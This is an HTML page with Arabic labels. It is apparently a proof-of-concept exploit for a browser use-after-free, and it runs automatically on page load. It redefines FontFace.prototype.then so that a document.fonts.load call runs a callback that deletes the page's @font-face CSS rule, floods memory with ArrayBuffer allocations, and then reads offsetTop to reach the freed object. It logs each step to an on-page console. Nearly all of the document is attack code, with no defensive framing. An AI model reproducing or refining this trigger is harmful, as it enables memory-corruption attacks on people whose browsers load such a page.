<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تفكيك التوقيت المتقدم - إجبار تدوير الذاكرة</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
        .error { color: #ff3333; }
    </style>
    
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>

    <h2>مراقبة تدوير الذاكرة التلقائي (Forced Heap Churning)</h2>
    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المتصفح...</div>

    <script>
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, isWarn = false) {
            const entry = document.createElement('div');
            entry.className = isWarn ? 'log warn' : 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        // دالة مخصصة لإغراق الذاكرة وإجبار المحرك على التنظيف
        function gc() {
            screenLog("جاري تنشيط ميكانيكية إغراق الذاكرة (Forced GC)...");
            for (let i = 0; i < 200; i++) {
                // إنشاء مصفوفات ضخمة بشكل متكرر لإجبار المحرك على التخلص من الكائنات المعلقة
                let s = new ArrayBuffer(0x10000); 
            }
        }

        function startExploitAnalysis() {
            consoleElement.innerHTML = ""; 
            screenLog("بدء تشغيل الثغرة تلقائياً...");

            try {
                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                document.fonts.add(A);
                void A.loaded;

                let fired = false;

                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            screenLog("!! تم تفعيل الكمين المنطقي !!", true);
                            
                            try {
                                document.getElementById('s').sheet.deleteRule(0);
                                screenLog("تم حذف القاعدة التنسيقية.");
                            } catch(e) { screenLog("خطأ أثناء الحذف: " + e.message, true); }
                            
                            // إطلاق الإغراق فوراً بعد الحذف للتأثير على الكائن المعلق
                            gc();

                            // قراءة الـ Offset المؤجلة لمعاينة السلوك
                            setTimeout(() => {
                                screenLog("محاولة القراءة المؤجلة (offsetTop)...");
                                let offset = document.body.offsetTop;
                                screenLog("قيمة الـ Offset المسترجعة: " + offset);
                            }, 20);
                        }
                        
                        return function(resolve) { if (resolve) resolve(); };
                    }
                });

                screenLog("إطلاق طلب التحميل document.fonts.load...");
                document.fonts.load('1em x', 'AB');

            } catch (err) {
                screenLog("خطأ عام في النظام: " + err.message, true);
            }
        }

        window.onload = () => {
            screenLog("تم تحميل الصفحة. الانتظار 1.5 ثانية للاستقرار المستند الفعلي...");
            setTimeout(startExploitAnalysis, 1500);
        };

        window.onerror = function(msg) {
            screenLog("استثناء غير معالج: " + msg, true);
            return true;
        };
    </script>
</body>
</html>
